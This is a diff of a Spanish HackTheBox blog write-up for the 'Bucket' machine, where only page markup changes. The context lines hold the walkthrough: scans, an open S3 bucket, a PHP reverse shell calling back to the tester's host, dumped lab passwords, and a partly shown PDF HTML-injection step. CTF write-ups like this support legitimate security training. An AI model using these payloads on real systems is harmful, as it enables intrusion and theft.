@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1263,7 +1263,7 @@
     <meta property="twitter:description" content="Bucket es una maquina de HackTheBox, encontramos un S3 con mala configuracion de autenticacion donde subimos una shell inversa en PHP. Encontramos DynamoDB localmente con credenciales para realizar movimiento lateral. Para la escalada de privilegios aprovechamos que Pd4Cmd genera PDFs con informacion de DynamoDB, en este ultimo insertamos HTML para obtener la clave privada de SSH de root. ">
   
 
-<meta name="generator" content="Hugo 0.92.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1609,9 +1609,6 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/s3/" class="single__tag" title="s3">s3</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/aws/" class="single__tag" title="aws">aws</a></li>
   
 
@@ -1622,6 +1619,9 @@
   
 
   <li><a href="https://sckull.github.io/tags/pd4cmd/" class="single__tag" title="Pd4Cmd">Pd4Cmd</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/s3/" class="single__tag" title="s3">s3</a></li>
   
 
 </ul>
@@ -1677,7 +1677,7 @@
     Matrix
   </span>
 </a></td>
-<td align="center"><div class="box"><pre tabindex="0"><code class="language-chart" data-lang="chart">{
+<td align="center"><div class="box"><pre><code class="language-chart" data-lang="chart">{
    &quot;type&quot;:&quot;radar&quot;,
    &quot;data&quot;:{
       &quot;labels&quot;:[&quot;Enumeration&quot;,&quot;Real-Life&quot;,&quot;CVE&quot;,&quot;Custom Explotation&quot;,&quot;CTF-Like&quot;],
@@ -1709,7 +1709,7 @@
 <p>Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1738,7 +1738,7 @@
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.91 scan initiated Fri Mar 19 18:25:42 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.212</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.91 scan initiated Fri Mar 19 18:25:42 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.212</span>
 Warning: 10.10.10.212 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span>.
 Nmap scan report <span class="k">for</span> 10.10.10.212 <span class="o">(</span>10.10.10.212<span class="o">)</span>
 Host is up <span class="o">(</span>0.094s latency<span class="o">)</span>.
@@ -1771,7 +1771,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Al intentar visitar el puerto 80 nos redirigia al dominio <code>bucket.htb</code> el cual agregamos en el archivo <code>/etc/hosts</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1789,7 +1789,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">HTTP/1.1 <span class="m">302</span> Found
+<pre class="chroma"><code class="language-bash" data-lang="bash">HTTP/1.1 <span class="m">302</span> Found
 Date: Sat, <span class="m">20</span> Mar <span class="m">2021</span> 00:03:45 GMT
 Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
 Location: http://bucket.htb/
@@ -1812,14 +1812,14 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 <p>Realizamos una enumeracion de directorios y archivos en el dominio <code>bucket.htb</code> y <code>s3.bucket.htb</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#bucket.htb</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#bucket.htb</span>
 ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ gobuster dir -u http://bucket.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">50</span> -q -x php,html,txt,xmlb
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1828,7 +1828,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1836,7 +1836,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#s3.bucket.htb</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#s3.bucket.htb</span>
 ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ gobuster dir -u s3.bucket.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">50</span> -x php,html,txt,xml,js -q 
 /health <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1844,11 +1844,11 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 /server-status <span class="o">(</span>Status: 403<span class="o">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="aws-bucket">AWS BUCKET</h2>
+</div><h2 id="aws-bucket-">AWS BUCKET</h2>
 <p>En el dominio &ldquo;principal&rdquo; solamente encontramos la pagina estatica. En el subdmominio encontramos dos direcciones, en la primera encontramos que aparentemente estan corriendo  &lsquo;s3&rsquo; y &lsquo;dynamodb&rsquo;.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1860,7 +1860,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ curl -X GET -s http://s3.bucket.htb/health   
 <span class="o">{</span><span class="s2">&#34;services&#34;</span>: <span class="o">{</span><span class="s2">&#34;s3&#34;</span>: <span class="s2">&#34;running&#34;</span>, <span class="s2">&#34;dynamodb&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}}</span>                                                                                                   
 
@@ -1875,7 +1875,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </div><p>Para la segunda direccion fue diferente ya que redirigía hacia otra direccion <code>http://444af250749d:4566/shell/</code>, la cual tiene &ldquo;disponible&rdquo; o &ldquo;permitidos&rdquo; algunos metodos HTTP.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1887,7 +1887,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">HTTP/1.1 <span class="m">200</span> 
+<pre class="chroma"><code class="language-bash" data-lang="bash">HTTP/1.1 <span class="m">200</span> 
 Date: Sat, <span class="m">20</span> Mar <span class="m">2021</span> 00:07:29 GMT
 Server: hypercorn-h11
 content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
@@ -1902,7 +1902,7 @@ access-control-expose-headers: x-amz-version-id
 </div><p>Ingresamos direcciones random y encontramos un mensaje de error, despues de investigar sobre este error encontramos que está relacionado con <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingBucket.html"><code>AWS S3 Buckets</code></a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1912,7 +1912,7 @@ access-control-expose-headers: x-amz-version-id
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#http://s3.bucket.htb/dynamodb/hello</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#http://s3.bucket.htb/dynamodb/hello</span>
 &lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
 &lt;Error&gt;
     &lt;Code&gt;NoSuchBucket&lt;/Code&gt;
@@ -1928,7 +1928,7 @@ access-control-expose-headers: x-amz-version-id
 <p>Realizamos la instalacion y <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html">configuracion</a> de <code>aws cli</code>, utilizamos la configuracion de ejemplo. Encontramos que existe un bucket llamado <code>adserver</code> y el bucket no está configurado correctamente ya que no solicita ningun tipo de autenticacion o mensaje de acceso.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1940,7 +1940,7 @@ access-control-expose-headers: x-amz-version-id
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ aws configure       
 AWS Access Key ID <span class="o">[</span>None<span class="o">]</span>: AKIAIOSFODNN7EXAMPLE
 AWS Secret Access Key <span class="o">[</span>None<span class="o">]</span>: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
@@ -1956,7 +1956,7 @@ Default output format <span class="o">[</span>None<span class="o">]</span>: json
 <p>Listamos los <a href="https://docs.aws.amazon.com/cli/latest/reference/s3api/get-bucket-acl.html#examples">permisos</a> del bucket y encontramos que el &ldquo;usuario&rdquo; es &ldquo;webfile&rdquo; y que tiene permisos <code>FULL_CONTROL</code> del bucket.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1975,7 +1975,7 @@ Default output format <span class="o">[</span>None<span class="o">]</span>: json
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ aws s3api get-bucket-acl --bucket adserver --endpoint-url http://s3.bucket.htb
 <span class="o">{</span>
     <span class="s2">&#34;Owner&#34;</span>: <span class="o">{</span>
@@ -2014,7 +2014,7 @@ Default output format <span class="o">[</span>None<span class="o">]</span>: json
 <p>De tal forma que podriamos listar los archivos que existen en el bucket.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2026,7 +2026,7 @@ Default output format <span class="o">[</span>None<span class="o">]</span>: json
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver
                            PRE images/
 2021-03-19 20:45:11       <span class="m">5344</span> index.html
@@ -2041,7 +2041,7 @@ Default output format <span class="o">[</span>None<span class="o">]</span>: json
 </div><p>Además podemos subir archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2060,7 +2060,7 @@ Default output format <span class="o">[</span>None<span class="o">]</span>: json
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ cat me.php                                             
 &lt;?php <span class="nb">echo</span> <span class="s2">&#34;s3 bucket adserver&#34;</span><span class="p">;</span> ?&gt;
 
@@ -2082,15 +2082,15 @@ s3 bucket adserver
 </div><p>Sabiendo que podemos subir archivos, subimos una shell inversa con la cual logramos obtener una shell con el usuario <code>www-data</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">&lt;?php <span class="nv">$sock</span><span class="o">=</span>fsockopen<span class="o">(</span><span class="s2">&#34;10.10.14.178&#34;</span>,1445<span class="o">)</span><span class="p">;</span><span class="nv">$proc</span><span class="o">=</span>proc_open<span class="o">(</span><span class="s2">&#34;/bin/sh -i&#34;</span>, array<span class="o">(</span><span class="nv">0</span><span class="o">=</span>&gt;<span class="nv">$sock</span>, <span class="nv">1</span><span class="o">=</span>&gt;<span class="nv">$sock</span>, <span class="nv">2</span><span class="o">=</span>&gt;<span class="nv">$sock</span><span class="o">)</span>,<span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span> ?&gt;
+<pre class="chroma"><code class="language-bash" data-lang="bash">&lt;?php <span class="nv">$sock</span><span class="o">=</span>fsockopen<span class="o">(</span><span class="s2">&#34;10.10.14.178&#34;</span>,1445<span class="o">)</span><span class="p">;</span><span class="nv">$proc</span><span class="o">=</span>proc_open<span class="o">(</span><span class="s2">&#34;/bin/sh -i&#34;</span>, array<span class="o">(</span><span class="nv">0</span><span class="o">=</span>&gt;<span class="nv">$sock</span>, <span class="nv">1</span><span class="o">=</span>&gt;<span class="nv">$sock</span>, <span class="nv">2</span><span class="o">=</span>&gt;<span class="nv">$sock</span><span class="o">)</span>,<span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span> ?&gt;
 </code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2106,7 +2106,7 @@ s3 bucket adserver
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>                                                                                                                                
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>                                                                                                                                
 └─$ nc -lvp <span class="m">1445</span>                                                                                                                                              
 listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1445</span> ...                                                                                                                                   
 connect to <span class="o">[</span>10.10.14.178<span class="o">]</span> from bucket.htb <span class="o">[</span>10.10.10.212<span class="o">]</span> <span class="m">45404</span>                                                                                                
@@ -2126,7 +2126,7 @@ www-data@bucket:/var/www/html$ <span class="nb">pwd</span>
 <p>Dentro de los procesos encontramos que dynamodb esta siendo ejecutado, además vemos algunos puertos corriendo localmente, ingestigamos acerca del archivo jar especificado en el proceso y encontramos que es dynamodb y que puede ser accedido atraves del cli de aws: <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DynamoDBLocal.DownloadingAndRunning.html">AWS</a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2146,7 +2146,7 @@ www-data@bucket:/var/www/html$ <span class="nb">pwd</span>
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>... REDACTED ...<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>... REDACTED ...<span class="o">]</span>
 root        <span class="m">1758</span>    <span class="m">1688</span>  <span class="m">0</span> Mar19 ?        00:00:24 java -Djava.library.path<span class="o">=</span>./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -sharedDb -port <span class="m">60571</span> -inMemo
 ry
 <span class="o">[</span>... REDACTED ...<span class="o">]</span>
@@ -2169,7 +2169,7 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::80         
 </div><p>Verificamos que <code>aws cli</code> estuviera instalado en la maquina, tambien configuramos nuestras credenciales y nuestra variable <code>$HOME</code> para que <code>aws</code> tuviera permisos de escritura.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2199,7 +2199,7 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::80         
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@bucket:/tmp$ which aws
+<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@bucket:/tmp$ which aws
 which aws
 /usr/bin/aws
 www-data@bucket:/tmp$ aws dynamodb list-tables --endpoint-url http://localhost:8000
@@ -2232,7 +2232,7 @@ www-data@bucket:/tmp$
 </div><p>Intentamos realizar un query a dynamo localmente a los diferentes puertos con lo que logramos observar las tablas existentes y descripcion, además logramos obtener credenciales.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2315,7 +2315,7 @@ www-data@bucket:/tmp$
 </span><span class="lnt">81
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@bucket:/tmp$ aws dynamodb list-tables --endpoint-url http://localhost:4566
+<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@bucket:/tmp$ aws dynamodb list-tables --endpoint-url http://localhost:4566
 &lt;db list-tables --endpoint-url http://localhost:4566
 <span class="o">{</span>
     <span class="s2">&#34;TableNames&#34;</span>: <span class="o">[</span>
@@ -2400,12 +2400,12 @@ www-data@bucket:/tmp$
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash:user_pass.txt" data-lang="bash:user_pass.txt">Mgmt:Management@#1@#
+<pre class="chroma"><code class="language-bash:user_pass.txt" data-lang="bash:user_pass.txt">Mgmt:Management@#1@#
 Cloudadm:Welcome123!
 Sysadm:n2vM-&lt;_K_Q:.Aa2
 </code></pre></td></tr></table>
@@ -2413,7 +2413,7 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2
 </div><p>Utilizamos una de las contraseñas para escalar al usuario <code>roy</code> lo cual funcionó, logramos obtener una shell y nuestra flag <code>user.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2428,7 +2428,7 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@bucket:/tmp$ su roy
+<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@bucket:/tmp$ su roy
 su roy
 Password: n2vM-&lt;_K_Q:.Aa2
 
@@ -2448,7 +2448,7 @@ roy@bucket:~$
 <p>Utilizamos <code>pspy</code> para ver los cronjobs que son ejecutados y observamos que el usuario root elimina archivos en la carpeta de &ldquo;objetos&rdquo; del bucket adsever, basicamente restaura archivos y el estado del bucket.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2467,7 +2467,7 @@ roy@bucket:~$
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">2021/03/20 01:49:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">819089</span> <span class="p">|</span> /usr/sbin/CRON -f 
+<pre class="chroma"><code class="language-bash" data-lang="bash">2021/03/20 01:49:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">819089</span> <span class="p">|</span> /usr/sbin/CRON -f 
 2021/03/20 01:49:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">819088</span> <span class="p">|</span> rm /var/www/bucket-app/files/* 
 2021/03/20 01:49:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">819087</span> <span class="p">|</span> /bin/sh -c rm /var/www/bucket-app/files/* 
 2021/03/20 01:49:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>    <span class="nv">PID</span><span class="o">=</span><span class="m">819086</span> <span class="p">|</span> /usr/sbin/CRON -f 
@@ -2490,7 +2490,7 @@ roy@bucket:~$
 <p>En los archivos del bucket, al inicio del archivo <code>index.php</code> encontramos que este puede recibir peticiones <code>POST</code> especificamente los datos <code>action=get_alerts</code> lo cual crearía una nueva conexion con DynamoDB y, obtendría los datos de la tabla <code>alerts</code> por titulo (<code>title</code>) y que este ultimo contenga el valor <code>Ransomware</code>, luego, realizaría un for para obtener la informacion individual (fila[<code>data</code>]) con lo que crearía un archivo con un nombre random dentro de la carpeta <code>file/</code>, al finalizar ejecuta <code>pd4ml</code> (html a pdf) para  crear un archivo con el nombre <code>result.pdf</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2520,7 +2520,7 @@ roy@bucket:~$
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ cat index.php                                                  
+<pre class="chroma"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ cat index.php                                                  
 &lt;?php                                                                                          
 require <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>                                                                                                                                                                
 use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<span class="p">;</span>                                                               
@@ -2554,7 +2554,7 @@ use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<
 <p>Primero debemos de <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html">crear la tabla</a> <code>alerts</code> la cual no existe.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2562,7 +2562,7 @@ use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">aws dynamodb create-table <span class="se">\
+<pre class="chroma"><code class="language-bash" data-lang="bash">aws dynamodb create-table <span class="se">\
 </span><span class="se"></span>	--table-name alerts <span class="se">\
 </span><span class="se"></span>	--attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="se">\
 </span><span class="se"></span>    --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="se">\
@@ -2573,12 +2573,12 @@ use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<
 </div><p>Ingresamos la informacion a la tabla con nuestro &ldquo;payload&rdquo; para lectura del archivo <code>/etc/passwd</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">aws dynamodb put-item <span class="se">\
+<pre class="chroma"><code class="language-bash" data-lang="bash">aws dynamodb put-item <span class="se">\
 </span><span class="se"></span>	--table-name alerts  <span class="se">\
